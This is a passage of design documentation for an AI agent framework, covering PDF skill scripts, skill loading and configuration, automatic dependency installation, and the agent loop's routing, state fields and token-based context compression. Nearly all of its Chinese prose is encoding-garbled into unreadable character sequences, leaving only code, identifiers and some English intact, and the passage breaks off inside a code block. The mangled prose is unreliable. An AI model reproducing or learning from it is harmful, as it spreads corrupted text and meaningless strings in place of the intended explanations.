1. ä½¿ç”¨`read_file`è¯»å–PDF,æ£€æŸ¥æ˜¯å¦ä¸ºè¡¨å•
2. å¦‚æœæç¤º"æ­¤PDFåŒ…å«Xä¸ªè¡¨å•å­—æ®µ",ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤:
   ```bash
   python skills/pdf/scripts/fill_fillable_fields.py \
       uploads/form.pdf \
       outputs/filled.pdf \
       --data '{"name": "å¼ ä¸‰", "age": "30"}'
   ```

#### ä¸å¯å¡«å†™è¡¨å•(æ‰«æä»¶/çº¯æ–‡æœ¬)
1. ä½¿ç”¨Redliningå·¥ä½œæµ(å‚è€ƒdocxæŠ€èƒ½)
2. æˆ–ä½¿ç”¨è¦†ç›–æ–‡æœ¬çš„æ–¹å¼

### åœºæ™¯2: åˆå¹¶å¤šä¸ªPDF
```bash
python skills/pdf/scripts/merge_pdfs.py \
    uploads/doc1.pdf uploads/doc2.pdf \
    --output outputs/merged.pdf
```

## å¯ç”¨è„šæœ¬

| è„šæœ¬åç§° | åŠŸèƒ½ | å‚æ•° |
|---------|------|------|
| extract_text.py | æå–æ–‡æœ¬ | input_pdf, output_txt |
| fill_fillable_fields.py | å¡«å†™è¡¨å•å­—æ®µ | input_pdf, output_pdf, --data |
| merge_pdfs.py | åˆå¹¶PDF | inputs..., --output |

## æ³¨æ„äº‹é¡¹
- æ‰€æœ‰è„šæœ¬ä½¿ç”¨ç›¸å¯¹è·¯å¾„(ç›¸å¯¹äºworkspaceæ ¹ç›®å½•)
- è¾“å‡ºæ–‡ä»¶ä¿å­˜åˆ°outputs/ç›®å½•
- å¤§æ–‡ä»¶(>10MB)å»ºè®®åˆ†é¡µå¤„ç†

---

## æŠ€èƒ½åŠ è½½æœºåˆ¶

### åŠ è½½è§¦å‘æ–¹å¼

| è§¦å‘æ–¹å¼ | ç¤ºä¾‹ | è¡Œä¸º |
|---------|------|------|
| @mention | `@pdf å¸®æˆ‘å¡«å†™è¡¨å•` | æ‰‹åŠ¨åŠ è½½æŠ€èƒ½ |
| æ–‡ä»¶ä¸Šä¼  | ä¸Šä¼ `report.pdf` | è‡ªåŠ¨åŠ è½½pdfæŠ€èƒ½ |
| é…ç½®å¯ç”¨ | `enabled: true` | å¯åŠ¨æ—¶åŠ è½½ |

### åŠ¨æ€åŠ è½½æµç¨‹

```
1. æ£€æµ‹è§¦å‘(ç”¨æˆ·@mention æˆ– ä¸Šä¼ åŒ¹é…æ–‡ä»¶)
   â†“
2. WorkspaceManager é“¾æ¥æŠ€èƒ½åˆ°å·¥ä½œåŒº
   - åˆ›å»ºç¬¦å·é“¾æ¥: workspace/skills/pdf â†’ generalAgent/skills/pdf
   â†“
3. æ£€æŸ¥dependencies (requirements.txt)
   - å¦‚æœå­˜åœ¨,æ‰§è¡Œ: pip install -r requirements.txt
   - æ ‡è®°ä¸ºå·²å®‰è£…(æ¯ä¸ªsessionåªå®‰è£…ä¸€æ¬¡)
   â†“
4. ç”Ÿæˆæé†’æ¶ˆæ¯
   - <system_reminder>å·²åŠ è½½æŠ€èƒ½: pdf</system_reminder>
   - <system_reminder>å»ºè®®: å…ˆä½¿ç”¨read_fileè¯»å–SKILL.md</system_reminder>
   â†“
5. Agent ä½¿ç”¨read_fileè¯»å–SKILL.md
   â†“
6. Agent æŒ‰ç…§SKILL.mdæŒ‡å¯¼æ‰§è¡Œä»»åŠ¡
```

---

## æŠ€èƒ½é…ç½®

é…ç½®æ–‡ä»¶:`generalAgent/config/skills.yaml`

```yaml
global:
  enabled: true
  auto_load_on_file_upload: true  # æ–‡ä»¶ä¸Šä¼ è‡ªåŠ¨åŠ è½½

core: []  # å¯åŠ¨æ—¶åŠ è½½çš„æŠ€èƒ½(é»˜è®¤ä¸ºç©º)

optional:
  pdf:
    enabled: false # é»˜è®¤ä¸åŠ è½½
    cn_name: "PDF æ–‡æ¡£å¤„ç†" # ä¸­æ–‡å
    always_available: false
    description: "PDFå¤„ç†å’Œè¡¨å•å¡«å†™"
    auto_load_on_file_types: ["pdf"]  # ä¸Šä¼ .pdfæ—¶è‡ªåŠ¨åŠ è½½

  docx:
    enabled: false
    description: "Wordæ–‡æ¡£åˆ›å»ºå’Œç¼–è¾‘"
    auto_load_on_file_types: ["docx", "doc"]

  xlsx:
    enabled: false
    description: "Excelæ•°æ®å¤„ç†å’Œåˆ†æ"
    auto_load_on_file_types: ["xlsx", "xls", "csv"]

  pptx:
    enabled: false
    description: "PowerPointæ¼”ç¤ºæ–‡ç¨¿åˆ›å»º"
    auto_load_on_file_types: ["pptx", "ppt"]

  artifacts-builder:
    enabled: false
    description: "ç”ŸæˆHTML/React/Mermaidå¯äº¤ä»˜ç‰©"

  skill-creator:
    enabled: false
    description: "å¿«é€Ÿåˆ›å»ºæ–°æŠ€èƒ½åŒ…"
```

---

## åˆ›å»ºè‡ªå®šä¹‰æŠ€èƒ½

### æ­¥éª¤1: åˆ›å»ºæŠ€èƒ½ç›®å½•

```bash
mkdir -p generalAgent/skills/my-skill/scripts
cd generalAgent/skills/my-skill
```

### æ­¥éª¤2: ç¼–å†™SKILL.md

```markdown
# æˆ‘çš„è‡ªå®šä¹‰æŠ€èƒ½

## æŠ€èƒ½æ¦‚è¿°
æè¿°æŠ€èƒ½åŠŸèƒ½...

## ä½¿ç”¨æŒ‡å—

### åœºæ™¯1: XXX
æ­¥éª¤è¯´æ˜...

### åœºæ™¯2: YYY
æ­¥éª¤è¯´æ˜...

## å¯ç”¨è„šæœ¬
| è„šæœ¬ | åŠŸèƒ½ |
|------|------|
| process.py | å¤„ç†æ•°æ® |
```

### æ­¥éª¤3: æ·»åŠ è„šæœ¬(å¯é€‰)

```python
# scripts/process.py
import sys

def main():
    input_file = sys.argv[1]
    output_file = sys.argv[2]
    # å¤„ç†é€»è¾‘
    print(f"Processed {input_file} â†’ {output_file}")

if __name__ == "__main__":
    main()
```

### æ­¥éª¤4: æ·»åŠ ä¾èµ–(å¯é€‰)

```
# requirements.txt
requests>=2.31.0
pandas>=2.0.0
```

### æ­¥éª¤5: é…ç½®æŠ€èƒ½

åœ¨`skills.yaml`æ·»åŠ :

```yaml
optional:
  my-skill:
    enabled: false
    description: "æˆ‘çš„è‡ªå®šä¹‰æŠ€èƒ½"
    auto_load_on_file_types: ["myext"]
```

### æ­¥éª¤6: ä½¿ç”¨æŠ€èƒ½

```
User> @my-skill å¸®æˆ‘å¤„ç†æ•°æ®
Agent> [è¯»å–SKILL.md] [æŒ‰ç…§æŒ‡å¯¼æ‰§è¡Œ]
```

---

## ä¾èµ–ç®¡ç†

### è‡ªåŠ¨å®‰è£…æœºåˆ¶

```python
# WorkspaceManageræ£€æµ‹requirements.txt
if (skill_path / "requirements.txt").exists():
    # æ‰§è¡Œå®‰è£…
    subprocess.run([
        "pip", "install", "-r",
        str(skill_path / "requirements.txt")
    ])

    # æ ‡è®°å·²å®‰è£…(é¿å…é‡å¤)
    skill_registry.mark_dependencies_installed(skill_id)
```

### å®‰è£…æ—¶æœº

- **é¦–æ¬¡@mention**: æŠ€èƒ½é¦–æ¬¡åŠ è½½æ—¶è‡ªåŠ¨å®‰è£…
- **æ¯sessionä¸€æ¬¡**: å·²å®‰è£…æŠ€èƒ½ä¸ä¼šé‡å¤å®‰è£…
- **å¤±è´¥é™çº§**: å®‰è£…å¤±è´¥æ—¶,Agentæ”¶åˆ°å‹å¥½é”™è¯¯æ¶ˆæ¯

### é”™è¯¯å¤„ç†

```
Script execution failed: Missing dependency

é”™è¯¯: ç¼ºå°‘Pythonæ¨¡å—'pypdf2'

å»ºè®®æ“ä½œ:
1. æ£€æŸ¥skills/pdf/requirements.txtæ˜¯å¦åŒ…å«æ­¤ä¾èµ–
2. æ‰‹åŠ¨å®‰è£…: pip install pypdf2
3. æˆ–è”ç³»æŠ€èƒ½ç»´æŠ¤è€…æ·»åŠ ä¾èµ–å£°æ˜
```

---

## æŠ€èƒ½æœ€ä½³å®è·µ

### SKILL.mdç¼–å†™åŸåˆ™

1. **ç»“æ„æ¸…æ™°**: æ¦‚è¿°â†’ä½¿ç”¨æŒ‡å—â†’è„šæœ¬å¼•ç”¨â†’æ³¨æ„äº‹é¡¹
2. **åœºæ™¯é©±åŠ¨**: æŒ‰ä½¿ç”¨åœºæ™¯ç»„ç»‡,ä¸æŒ‰åŠŸèƒ½åˆ—è¡¨
3. **ç¤ºä¾‹å…·ä½“**: æä¾›å®Œæ•´çš„å‘½ä»¤ç¤ºä¾‹,åŒ…å«æ‰€æœ‰å‚æ•°
4. **è·¯å¾„è§„èŒƒ**: ä½¿ç”¨ç›¸å¯¹è·¯å¾„,æ˜ç¡®è¾“å…¥/è¾“å‡ºç›®å½•

### è„šæœ¬è®¾è®¡åŸåˆ™

1. **èŒè´£å•ä¸€**: ä¸€ä¸ªè„šæœ¬åšä¸€ä»¶äº‹
2. **å‚æ•°æ¸…æ™°**: ä½¿ç”¨argparse,æä¾›--help
3. **é”™è¯¯å‹å¥½**: æ•è·å¼‚å¸¸,è¿”å›æ¸…æ™°é”™è¯¯æ¶ˆæ¯
4. **è·¯å¾„å®‰å…¨**: æ£€æŸ¥è·¯å¾„æ˜¯å¦åœ¨workspaceå†…

### ä¾èµ–ç®¡ç†åŸåˆ™

1. **æœ€å°ä¾èµ–**: åªå£°æ˜å¿…éœ€çš„åŒ…
2. **ç‰ˆæœ¬é”å®š**: ä½¿ç”¨`package>=x.y.z`é¿å…breaking changes
3. **å†²çªé¿å…**: æ£€æŸ¥ä¸æ¡†æ¶ä¾èµ–çš„å…¼å®¹æ€§

---

## å‚è€ƒä»£ç ä½ç½®

| åŠŸèƒ½æ¨¡å— | ä»£ç è·¯å¾„ |
|---------|---------|
| æŠ€èƒ½æ³¨å†Œè¡¨ | `generalAgent/skills/registry.py` |
| æŠ€èƒ½åŠ è½½å™¨ | `generalAgent/skills/loader.py` |
| æŠ€èƒ½é…ç½® | `generalAgent/config/skills.yaml` |
| æŠ€èƒ½ç›®å½• | `generalAgent/skills/` |
| å·¥ä½œåŒºç®¡ç† | `shared/workspace/manager.py` |
| ä¾èµ–å®‰è£…é€»è¾‘ | `shared/workspace/manager.py:link_skill()` |

---

## å››ã€Agent æµç¨‹ä¸çŠ¶æ€ç®¡ç†

### äº§å“å®šä½

Agent æµç¨‹ä¸çŠ¶æ€ç®¡ç†æ˜¯æ¡†æ¶çš„æ ¸å¿ƒæ‰§è¡Œå¼•æ“ï¼ŒåŸºäº **Agent Loop æ¶æ„**ï¼ˆReAct æ¨¡å¼ï¼‰å®ç° LLM è‡ªä¸»å†³ç­–çš„å¤šè½®å¯¹è¯æµç¨‹ã€‚ç³»ç»Ÿé€šè¿‡çŠ¶æ€ç®¡ç†è¿½è¸ªä¼šè¯ä¸Šä¸‹æ–‡ã€å·¥å…·è°ƒç”¨ã€ä»»åŠ¡è¿›åº¦ï¼Œå¹¶æä¾›è‡ªåŠ¨ä¸Šä¸‹æ–‡å‹ç¼©æœºåˆ¶åº”å¯¹é•¿å¯¹è¯åœºæ™¯ã€‚

**ä»·å€¼ä¸»å¼ **ï¼š
- **è‡ªä¸»å†³ç­–**ï¼šLLM è‡ªä¸»é€‰æ‹©å·¥å…·è°ƒç”¨æˆ–ç»“æŸå¯¹è¯ï¼Œæ— éœ€äººå·¥é¢„å®šä¹‰æ‰§è¡Œæµç¨‹
- **çŠ¶æ€éš”ç¦»**ï¼šæ”¯æŒä¸» Agent ä¸ Subagent ä¸Šä¸‹æ–‡éš”ç¦»ï¼Œé˜²æ­¢çŠ¶æ€æ±¡æŸ“
- **è‡ªåŠ¨ä¼˜åŒ–**ï¼šToken ä½¿ç”¨ç‡è¶…è¿‡ 95% æ—¶è‡ªåŠ¨å‹ç¼©å†å²ï¼Œæ— éœ€ç”¨æˆ·å¹²é¢„
- **å¯è§‚æµ‹æ€§**ï¼šå®Œæ•´çš„ Loop è®¡æ•°ã€Token è¿½è¸ªã€èŠ‚ç‚¹æ—¥å¿—ï¼Œä¾¿äºè°ƒè¯•å’Œä¼˜åŒ–

---

### æ ¸å¿ƒåœºæ™¯

#### åœºæ™¯ 1ï¼šå¤šè½®ç ”ç©¶ä»»åŠ¡

**ç”¨æˆ·æ•…äº‹**ï¼š
ç”¨æˆ·è¦æ±‚ "ç ”ç©¶ Python 3.13 çš„æ–°ç‰¹æ€§å¹¶ç”Ÿæˆå¯¹æ¯”æŠ¥å‘Š"ï¼ŒAgent éœ€è¦ï¼š
1. æœç´¢å®˜æ–¹æ–‡æ¡£
2. æå–å…³é”®ç‰¹æ€§
3. å¯¹æ¯”æ—§ç‰ˆæœ¬
4. ç”Ÿæˆ Markdown æŠ¥å‘Š
5. ä¿å­˜åˆ° outputs/ ç›®å½•

**ç³»ç»Ÿè¡Œä¸º**ï¼š
- Planner èŠ‚ç‚¹å†³å®šè°ƒç”¨ search_web å·¥å…·
- Tools èŠ‚ç‚¹æ‰§è¡Œæœç´¢ï¼Œè¿”å›ç»“æœ
- Planner èŠ‚ç‚¹åˆ†æç»“æœï¼Œå†³å®šè°ƒç”¨ read_file
- å¾ªç¯ç›´åˆ°ç”ŸæˆæŠ¥å‘Š
- Finalize èŠ‚ç‚¹æ ¼å¼åŒ–æœ€ç»ˆè¾“å‡º

**å…³é”®ç‚¹**ï¼š
- æœ€å¤šæ‰§è¡Œ 100 ä¸ª Loopï¼ˆå¯é…ç½®ï¼‰
- æ¯æ¬¡ Loop ç´¯è®¡ Token ä½¿ç”¨
- è‡ªåŠ¨æ£€æµ‹ Token ä½¿ç”¨ç‡

---

#### åœºæ™¯ 2ï¼šé•¿å¯¹è¯è‡ªåŠ¨å‹ç¼©

**ç”¨æˆ·æ•…äº‹**ï¼š
ç”¨æˆ·ä¸ Agent è¿›è¡Œ 300 è½®å¯¹è¯ï¼ˆçº¦ 120K tokensï¼‰ï¼Œç³»ç»Ÿéœ€è¦åœ¨ä¸ä¸­æ–­å¯¹è¯çš„æƒ…å†µä¸‹é‡Šæ”¾ Token ç©ºé—´ã€‚

**ç³»ç»Ÿè¡Œä¸º**ï¼š
1. Planner èŠ‚ç‚¹æ£€æµ‹ Token ä½¿ç”¨ç‡è¾¾åˆ° 95%
2. è‡ªåŠ¨è·¯ç”±åˆ° Summarization èŠ‚ç‚¹
3. LLM å°†å‰ 290 æ¡æ¶ˆæ¯å‹ç¼©ä¸º 1 æ¡æ‘˜è¦
4. ä¿ç•™æœ€è¿‘ 10 æ¡æ¶ˆæ¯
5. è¿”å› Planner èŠ‚ç‚¹ç»§ç»­æ‰§è¡Œ

**å…³é”®ç‚¹**ï¼š
- ç”¨æˆ·æ— æ„ŸçŸ¥ï¼ˆæ— å‹ç¼©é€šçŸ¥ï¼‰
- ä¿ç•™æœ€è¿‘å¯¹è¯ä¸Šä¸‹æ–‡ï¼ˆé»˜è®¤ä¿ç•™ 15% context windowï¼‰
- æ”¯æŒ LLM å‹ç¼©å’Œç´§æ€¥æˆªæ–­ä¸¤ç§ç­–ç•¥

---

#### åœºæ™¯ 3ï¼šSubagent çŠ¶æ€éš”ç¦»

**ç”¨æˆ·æ•…äº‹**ï¼š
ç”¨æˆ·åœ¨ä¸» Agent ä¸­è°ƒç”¨ delegate_task å°†å­ä»»åŠ¡åˆ†é…ç»™ Subagentï¼Œéœ€è¦ç¡®ä¿ Subagent ä¸å¹²æ‰°ä¸» Agent çš„çŠ¶æ€ã€‚

**ç³»ç»Ÿè¡Œä¸º**ï¼š
- Subagent åˆ›å»ºç‹¬ç«‹çš„ AppState å®ä¾‹
- `context_id` è®¾ç½®ä¸º `subagent-{uuid}`
- `parent_context` æŒ‡å‘ä¸» Agent çš„ `context_id`
- ç»§æ‰¿å·¥å…·ã€æŠ€èƒ½ã€å·¥ä½œåŒºè·¯å¾„
- ä¸ç»§æ‰¿æ¶ˆæ¯å†å²
- å®Œæˆåå°†ç»“æœè¿”å›ä¸» Agent

**å…³é”®ç‚¹**ï¼š
- çŠ¶æ€éš”ç¦»é˜²æ­¢æ±¡æŸ“
- å·¥å…·å’Œå·¥ä½œåŒºç»§æ‰¿æé«˜æ•ˆç‡
- æ”¯æŒåµŒå¥—è°ƒç”¨ï¼ˆæœ€å¤§æ·±åº¦ 3 å±‚ï¼‰

---

### åŠŸèƒ½éœ€æ±‚

#### éœ€æ±‚ 1ï¼šAgent Loop æ¶æ„

**éœ€æ±‚æè¿°**ï¼š
å®ç°åŸºäº LangGraph çš„ Agent Loop æ¶æ„ï¼ˆReAct æ¨¡å¼ï¼‰ï¼Œæ”¯æŒ LLM è‡ªä¸»å†³ç­–çš„å¤šè½®å¯¹è¯æµç¨‹ã€‚

**æµç¨‹å›¾**ï¼š

```
START â†’ agent â‡„ tools â†’ agent â‡„ ... â†’ finalize â†’ END
          â†‘      â†“
          â†‘ summarization (auto-compress when >95% tokens)
          â†‘______â†“
```

**èŠ‚ç‚¹å®šä¹‰**ï¼š

| èŠ‚ç‚¹ | åŠŸèƒ½ | è¾“å…¥ | è¾“å‡º | ä¸‹ä¸€æ­¥ |
|------|------|------|------|--------|
| agent (Planner) | LLM æ¨ç†ï¼Œå†³ç­–å·¥å…·è°ƒç”¨ | æ¶ˆæ¯å†å² + å¯è§å·¥å…· | AIMessage (with/without tool_calls) | tools / finalize / summarization |
| tools | æ‰§è¡Œå·¥å…·è°ƒç”¨ | tool_calls | ToolMessage[] | agent |
| summarization | å‹ç¼©æ¶ˆæ¯å†å² | æ¶ˆæ¯å†å² | å‹ç¼©åæ¶ˆæ¯ | agent |
| finalize | æ ¼å¼åŒ–æœ€ç»ˆè¾“å‡º | æ¶ˆæ¯å†å² | æœ€ç»ˆ AIMessage | END |

**è·¯ç”±é€»è¾‘**ï¼š

```python
# generalAgent/graph/routing.py:agent_route()
def agent_route(state: AppState):
    # 1. æ£€æŸ¥ Loop é™åˆ¶
    if loops >= max_loops:
        return "finalize"

    # 2. æ£€æŸ¥ Token ä½¿ç”¨ç‡ï¼ˆ>95% è§¦å‘å‹ç¼©ï¼‰
    if needs_compression and not auto_compressed:
        return "summarization"

    # 3. æ£€æŸ¥å·¥å…·è°ƒç”¨
    if last_message.tool_calls:
        return "tools"
    else:
        return "finalize"
```

**éªŒæ”¶æ ‡å‡†**ï¼š
- âœ… æ”¯æŒæœ€å¤§ 100 Loopï¼ˆå¯é…ç½® 1-500ï¼‰
- âœ… Token ä½¿ç”¨ç‡ >95% æ—¶è‡ªåŠ¨è·¯ç”±åˆ° summarization
- âœ… LLM å†³å®šæ— éœ€å·¥å…·æ—¶è‡ªåŠ¨ç»“æŸ
- âœ… Loop é™åˆ¶è§¦å‘æ—¶å¼ºåˆ¶ finalize

**å®ç°å‚è€ƒ**ï¼š`generalAgent/graph/builder.py`ã€`generalAgent/graph/routing.py`

---

#### éœ€æ±‚ 2ï¼šçŠ¶æ€å®šä¹‰ï¼ˆAppStateï¼‰

**éœ€æ±‚æè¿°**ï¼š
å®šä¹‰å®Œæ•´çš„ä¼šè¯çŠ¶æ€ç»“æ„ï¼ŒåŒ…å«æ¶ˆæ¯å†å²ã€å·¥å…·çŠ¶æ€ã€ä»»åŠ¡è¿½è¸ªã€ä¸Šä¸‹æ–‡éš”ç¦»ã€Token è¿½è¸ªç­‰æ‰€æœ‰å¿…è¦ä¿¡æ¯ã€‚

**çŠ¶æ€å­—æ®µ**ï¼š

```python
# generalAgent/graph/state.py:AppState
class AppState(TypedDict, total=False):
    # ========== æ¶ˆæ¯ä¸å¤šåª’ä½“ ==========
    messages: List[BaseMessage]  # LangChain æ¶ˆæ¯åˆ—è¡¨ï¼ˆç´¯åŠ å™¨ï¼‰
    images: List[Any]  # å›¾ç‰‡åˆ—è¡¨

    # ========== æŠ€èƒ½ä¸å·¥å…· ==========
    active_skill: Optional[str]  # å½“å‰æ¿€æ´»çš„æŠ€èƒ½ ID
    allowed_tools: List[str]  # æŠ€èƒ½å…è®¸ä½¿ç”¨çš„å·¥å…·åˆ—è¡¨
    mentioned_agents: List[str]  # å†å² @mention è®°å½•
    new_mentioned_agents: List[str]  # æœ¬è½®æ–°å¢ @mentionï¼ˆç”¨äºæé†’ï¼‰
    persistent_tools: List[str]  # æŒä¹…åŒ–å·¥å…·ï¼ˆå§‹ç»ˆå¯ç”¨ï¼‰

    # ========== ä»»åŠ¡è¿½è¸ª ==========
    todos: List[dict]  # ä»»åŠ¡åˆ—è¡¨ï¼ˆTodoWrite å·¥å…·ç®¡ç†ï¼‰

    # ========== ä¸Šä¸‹æ–‡éš”ç¦» ==========
    context_id: str  # "main" æˆ– "subagent-{uuid}"
    parent_context: Optional[str]  # çˆ¶ä¸Šä¸‹æ–‡ IDï¼ˆä»… Subagentï¼‰

    # ========== æ‰§è¡Œæ§åˆ¶ ==========
    loops: int  # å…¨å±€ Loop è®¡æ•°å™¨
    max_loops: int  # Loop ä¸Šé™ï¼ˆé»˜è®¤ 100ï¼‰

    # ========== æ¨¡å‹åå¥½ ==========
    model_pref: Optional[str]  # ç”¨æˆ·æŒ‡å®šæ¨¡å‹ç±»å‹ï¼ˆvision/code/...ï¼‰

    # ========== ä¼šè¯ä¸Šä¸‹æ–‡ ==========
    thread_id: Optional[str]  # ä¼šè¯ IDï¼ˆç”¨äºæŒä¹…åŒ–ï¼‰
    user_id: Optional[str]  # ç”¨æˆ· IDï¼ˆæœªæ¥æ‰©å±•ï¼‰
    workspace_path: Optional[str]  # å·¥ä½œåŒºè·¯å¾„
    uploaded_files: List[Any]  # ä¸Šä¼ æ–‡ä»¶åˆ—è¡¨ï¼ˆå†å²è®°å½•ï¼‰
    new_uploaded_files: List[Any]  # æœ¬è½®æ–°ä¸Šä¼ æ–‡ä»¶ï¼ˆç”¨äºæé†’ï¼‰

    # ========== Agent ç³»ç»Ÿ ==========
    agent_call_stack: List[str]  # è°ƒç”¨æ ˆï¼ˆæ£€æµ‹å¾ªç¯ï¼‰
    agent_call_history: List[str]  # è°ƒç”¨å†å²ï¼ˆå®¡è®¡ï¼‰
    current_agent: Optional[str]  # å½“å‰æ´»è·ƒ Agent

    # ========== Token è¿½è¸ªä¸å‹ç¼© ==========
    cumulative_prompt_tokens: int  # å½“å‰ä¸Šä¸‹æ–‡å¤§å°ï¼ˆtokensï¼‰
    cumulative_completion_tokens: int  # ç´¯è®¡è¾“å‡º tokens
    last_prompt_tokens: int  # ä¸Šæ¬¡è°ƒç”¨çš„ prompt tokens
    compact_count: int  # å‹ç¼©æ¬¡æ•°
    last_compact_strategy: Optional[str]  # ä¸Šæ¬¡å‹ç¼©ç­–ç•¥
    last_compression_ratio: Optional[float]  # ä¸Šæ¬¡å‹ç¼©æ¯”
    auto_compressed_this_request: bool  # æœ¬è½®æ˜¯å¦å·²å‹ç¼©
    needs_compression: bool  # æ˜¯å¦éœ€è¦å‹ç¼©ï¼ˆè·¯ç”±æ ‡å¿—ï¼‰
```

**å­—æ®µåˆ†ç±»**ï¼š

| ç±»åˆ« | å­—æ®µæ•° | ç”¨é€” |
|------|--------|------|
| æ¶ˆæ¯ç®¡ç† | 2 | å¯¹è¯å†å²ã€å›¾ç‰‡ |
| å·¥å…·/æŠ€èƒ½ | 5 | åŠ¨æ€åŠ è½½ã€æƒé™æ§åˆ¶ |
| ä»»åŠ¡è¿½è¸ª | 1 | TodoWrite å·¥å…· |
| ä¸Šä¸‹æ–‡éš”ç¦» | 2 | ä¸» Agent / Subagent éš”ç¦» |
| æ‰§è¡Œæ§åˆ¶ | 2 | Loop é™åˆ¶ |
| ä¼šè¯ä¸Šä¸‹æ–‡ | 5 | æŒä¹…åŒ–ã€å·¥ä½œåŒº |
| Agent ç³»ç»Ÿ | 3 | Multi-Agent åä½œ |
| Token ç®¡ç† | 9 | è‡ªåŠ¨å‹ç¼© |

**éªŒæ”¶æ ‡å‡†**ï¼š
- âœ… æ”¯æŒ LangChain æ¶ˆæ¯ç´¯åŠ å™¨ï¼ˆ`add_messages`ï¼‰
- âœ… æ”¯æŒä¸» Agent å’Œ Subagent çŠ¶æ€éš”ç¦»
- âœ… æ”¯æŒ Token è¿½è¸ªå’Œå‹ç¼©æ ‡å¿—ä½
- âœ… æ‰€æœ‰å­—æ®µç±»å‹æ­£ç¡®ï¼Œæ”¯æŒ TypedDict ç±»å‹æ£€æŸ¥

**å®ç°å‚è€ƒ**ï¼š`generalAgent/graph/state.py`

---

#### éœ€æ±‚ 3ï¼šPlanner èŠ‚ç‚¹

**éœ€æ±‚æè¿°**ï¼š
å®ç° Planner èŠ‚ç‚¹ï¼ˆagent èŠ‚ç‚¹ï¼‰ï¼Œè´Ÿè´£ LLM æ¨ç†ã€å·¥å…·å¯è§æ€§æ§åˆ¶ã€åŠ¨æ€æé†’ç”Ÿæˆã€Token ç›‘æ§ã€‚

**æ ¸å¿ƒé€»è¾‘**ï¼š

```
1. æ”¶é›†å¯è§å·¥å…·ï¼ˆpersistent + @mentionedï¼‰
2. æ£€æµ‹å¤šæ¨¡æ€è¾“å…¥ï¼ˆå›¾ç‰‡/ä»£ç ï¼‰
3. æ„å»º SystemMessageï¼ˆé™æ€ï¼ŒKV Cache ä¼˜åŒ–ï¼‰
4. æ„å»ºåŠ¨æ€æé†’ï¼ˆæŠ€èƒ½ã€å·¥å…·ã€TODOã€æ–‡ä»¶ä¸Šä¼ ï¼‰
5. è¿½åŠ æé†’åˆ°æœ€åä¸€æ¡ HumanMessage
6. è°ƒç”¨ LLMï¼ˆmodel_registry + model_resolverï¼‰
7. æå– Token ä½¿ç”¨ä¿¡æ¯
8. æ£€æŸ¥ Token ä½¿ç”¨ç‡ï¼ˆ>95% è®¾ç½® needs_compression æ ‡å¿—ï¼‰
9. è¿”å› AIMessage + æ›´æ–°çŠ¶æ€
```

**SystemMessage ç»“æ„**ï¼ˆKV Cache ä¼˜åŒ–ï¼‰ï¼š

```
[å›ºå®šå†…å®¹ - ç³»ç»ŸæŒ‡ä»¤]
[æŠ€èƒ½ç›®å½• - å¯ç”¨çš„æŠ€èƒ½åˆ—è¡¨]
[Agent ç›®å½• - å¯ç”¨çš„ Agent åˆ—è¡¨]
[æ—¶é—´æˆ³ - åˆ†é’Ÿçº§ç²¾åº¦ï¼Œå¯åŠ¨æ—¶ç”Ÿæˆä¸€æ¬¡]
```

**åŠ¨æ€æé†’è¿½åŠ åˆ°æœ€åä¸€æ¡æ¶ˆæ¯**ï¼š

```
User> å¸®æˆ‘åˆ†æè¿™ä¸ª PDF

[ç³»ç»Ÿè‡ªåŠ¨è¿½åŠ åˆ° HumanMessage]
<system_reminder>
âš ï¸ æ£€æµ‹åˆ°ä¸Šä¼ æ–‡ä»¶: report.pdf (PDF æ ¼å¼)
å»ºè®®ä½¿ç”¨ @pdf æŠ€èƒ½å¤„ç†
</system_reminder>

<system_reminder>
âš ï¸ ä»»åŠ¡è¿½è¸ª (2 ä¸ªæœªå®Œæˆ):
  [è¿›è¡Œä¸­] åˆ†æ PDF æ–‡æ¡£
  [å¾…å®Œæˆ] ç”Ÿæˆåˆ†ææŠ¥å‘Š
</system_reminder>
```

**Token ç›‘æ§é€»è¾‘**ï¼š

| Token ä½¿ç”¨ç‡ | è¡Œä¸º | æ—¥å¿—çº§åˆ« |
|-------------|------|---------|
| <75% | æ­£å¸¸æ‰§è¡Œ | INFO |
| 75%-85% | è®°å½•ä¿¡æ¯ï¼ŒåŠ¨æ€åŠ è½½ compact_context å·¥å…· | INFO |
| 85%-95% | è­¦å‘Šï¼Œæ·»åŠ  Token æé†’åˆ°æ¶ˆæ¯ | WARNING |
| >95% | è·³è¿‡ LLM è°ƒç”¨ï¼Œè®¾ç½® needs_compression=True | WARNING |

**éªŒæ”¶æ ‡å‡†**ï¼š
- âœ… SystemMessage å›ºå®šä¸å˜ï¼ˆKV Cache ä¼˜åŒ–ï¼‰
- âœ… åŠ¨æ€æé†’è¿½åŠ åˆ°æœ€åä¸€æ¡ HumanMessage
- âœ… Token ä½¿ç”¨ç‡ >95% æ—¶è®¾ç½®å‹ç¼©æ ‡å¿—ä½
- âœ… æ”¯æŒå¤šæ¨¡æ€è¾“å…¥æ£€æµ‹ï¼ˆå›¾ç‰‡ â†’ è‡ªåŠ¨é€‰æ‹© vision æ¨¡å‹ï¼‰
- âœ… æ­£ç¡®ç´¯åŠ  Loop è®¡æ•°å™¨

**å®ç°å‚è€ƒ**ï¼š`generalAgent/graph/nodes/planner.py`

---

#### éœ€æ±‚ 4ï¼šTools èŠ‚ç‚¹ï¼ˆå·¥å…·æ‰§è¡Œï¼‰

**éœ€æ±‚æè¿°**ï¼š
å®ç° Tools èŠ‚ç‚¹ï¼Œè´Ÿè´£æ‰§è¡Œ LLM ç”Ÿæˆçš„å·¥å…·è°ƒç”¨ï¼Œå¹¶è¿”å› ToolMessage ç»“æœã€‚

**æ‰§è¡Œæµç¨‹**ï¼š

```
1. è§£æ AIMessage ä¸­çš„ tool_calls
2. å¯¹æ¯ä¸ª tool_call:
   a. ä» ToolRegistry æŸ¥æ‰¾å·¥å…·
   b. å¦‚æœæœªæ‰¾åˆ°ï¼Œå°è¯• load_on_demand()
   c. æ‰§è¡Œå·¥å…·å‡½æ•°ï¼ˆä¼ å…¥å‚æ•°ï¼‰
   d. æ•è·å¼‚å¸¸å¹¶è¿”å›é”™è¯¯æ¶ˆæ¯
3. æ”¶é›†æ‰€æœ‰ ToolMessage
4. è¿”å›åˆ° Planner èŠ‚ç‚¹ï¼ˆæˆ–å½“å‰ Agentï¼‰
```

**HITL é›†æˆ**ï¼ˆå¯é€‰ï¼‰ï¼š

```python
# å¦‚æœå¯ç”¨ ApprovalCheckerï¼ŒTools èŠ‚ç‚¹ä¼šæ£€æŸ¥å·¥å…·è°ƒç”¨æ˜¯å¦éœ€è¦å®¡æ‰¹
